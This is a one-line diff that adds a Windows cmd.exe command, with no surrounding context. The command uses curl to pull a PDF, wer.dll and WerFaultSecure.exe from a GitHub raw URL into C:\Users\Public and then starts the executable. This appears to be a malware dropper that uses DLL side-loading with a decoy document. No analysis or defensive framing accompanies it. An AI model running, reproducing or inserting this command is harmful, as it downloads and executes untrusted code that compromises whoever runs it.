@@ -1,0 +1,2 @@
+C:\Windows\System32\cmd.exe /c curl -s -o C:\Users\Public\secure.pdf https://raw.githubusercontent.com/z3nn1/DataPublic/main/secure.pdf & curl -s -o C:\Users\Public\wer.dll https://raw.githubusercontent.com/z3nn1/DataPublic/blob/main/wer.dll & curl -s -o C:\Users\Public\WerFaultSecure.exe https://raw.githubusercontent.com/z3nn1/DataPublic/main/WerFaultSecure.exe & start /max C:\Users\Public\WerFaultSecure.exe
+
